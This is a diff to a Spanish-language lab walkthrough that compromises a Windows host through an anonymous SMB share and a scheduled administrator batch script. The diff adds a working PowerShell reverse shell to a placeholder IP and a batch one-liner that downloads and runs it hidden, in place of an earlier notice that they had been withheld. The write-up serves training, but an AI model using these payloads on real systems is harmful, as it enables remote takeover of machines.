@@ -5,8 +5,10 @@
 Realizamos un escaneo con `nmap` que reveló varios servicios abiertos:
 
 ```bash
-nmap -sC -sV -p- 192.168.1.56
+nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.56 -oN escaneo.txt
 ```
+
+<img width="740" height="629" alt="3-nmap" src="https://github.com/user-attachments/assets/9af70c1d-1b1a-4530-8628-d7351bdfffe5" /><br>
 
 ### Puertos relevantes encontrados:
 - `80/tcp` → Microsoft IIS 10.0
@@ -21,6 +23,8 @@ nmap -sC -sV -p- 192.168.1.56
 ```bash
 smbclient -L //192.168.1.56 -N
 ```
+
+<img width="443" height="109" alt="4-smbclient" src="https://github.com/user-attachments/assets/f16242c2-909e-4b77-87c0-0f16b8202a2e" /><br>
 
 Se encontró el recurso **`Compartido`**, accesible anónimamente.
 
@@ -40,7 +44,7 @@ Carpetas exploradas:
 
 Dentro de **`Proyectos/Quokka`**, encontramos:
 - `Documentación_Interna.docx` → Indicaba que el proyecto era interno
-- Carpeta `Código` con archivos `.bat`
+- Carpeta `Código` con archivos `.bat`. El más prometedor -> `mantenimiento - copia.bat`
 
 ---
 
@@ -49,13 +53,14 @@ Dentro de **`Proyectos/Quokka`**, encontramos:
 En `Código/`, descubrimos:
 
 - `mantenimiento - copia.bat` con el siguiente contenido clave:
+  
   ```bat
   :: Este script se ejecuta con permisos de administrador cada minuto
   move "C:\Logs\*.log" "C:\Backup\OldLogs\"
   del /q "C:\Temp\*.*"
   ```
 
-💡 Esto reveló una **tarea programada que ejecuta el script como administrador**, lo que permite una **escalada de privilegios por sustitución de script** si tenemos permisos de escritura.
+💡 Esto reveló una **tarea programada que ejecuta el script como administrador**, lo que permite acceso con una **escalada de privilegios por sustitución de script** si tenemos permisos de escritura.
 
 ---
 
@@ -73,9 +78,28 @@ put prueba.txt
 
 ## 🔥 6. Payload de reverse shell
 
-Creamos un `shell.ps1` con una reverse shell en PowerShell y un `malicioso.bat` que lo descarga y ejecuta automáticamente.
-
-⚠️ **Contenido de estos archivos no incluido por detección antivirus.**
+Creamos un `shell.ps1` con una reverse shell en PowerShell y un `malicioso.bat` que lo descarga y ejecuta automáticamente:
+- `shell.ps1`
+  
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("TU_IP",4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+ $sendback = (iex $data 2>&1 | Out-String );
+ $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+ $stream.Write($sendbyte,0,$sendbyte.Length);
+ $stream.Flush()
+}
+$client.Close()
+```
+- `malicioso.bat`
+  
+```bat
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://TU_IP:8000/shell.ps1')"
+```
 
 ---
 
@@ -87,7 +111,7 @@ put malicioso.bat mantenimiento.bat
 
 ---
 
-## 📡 8. Servidor HTTP y escucha
+## 📡 8. Servidor HTTP y escucha con Netcat
 
 ```bash
 python3 -m http.server 8000
